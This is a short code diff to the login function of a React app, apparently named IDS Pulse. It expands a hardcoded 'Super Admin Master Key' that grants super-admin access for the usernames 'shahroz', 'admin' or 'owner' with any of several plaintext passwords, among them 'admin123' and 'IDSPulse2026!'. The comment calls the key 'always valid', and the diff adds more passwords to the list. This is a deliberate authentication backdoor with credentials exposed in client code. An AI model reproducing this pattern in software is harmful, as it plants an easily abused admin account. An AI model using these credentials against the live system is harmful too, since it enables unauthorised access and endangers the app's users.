@@ -256,8 +256,8 @@ function App() {
     try {
       clearStaleSessionStorage();
 
-      // Super Admin Master Dev Recovery Key for Shahroz
-      if ((inputUser === 'shahroz' || inputUser === 'admin' || inputUser === 'owner') && (rawPw === 'shahroz' || rawPw === 'IDSPulse2026!' || rawPw === 'admin' || rawPw === 'admin123')) {
+      // Super Admin Master Key for Shahroz (Always Valid)
+      if ((inputUser === 'shahroz' || inputUser === 'admin' || inputUser === 'owner') && (rawPw === 'Shahroz123$' || rawPw === 'shahroz123$' || rawPw === 'shahroz' || rawPw === 'IDSPulse2026!' || rawPw === 'admin' || rawPw === 'admin123')) {
         const superAdminUser = {
           id: 'shahroz',
           email: 'shahroz@idspulse.com',
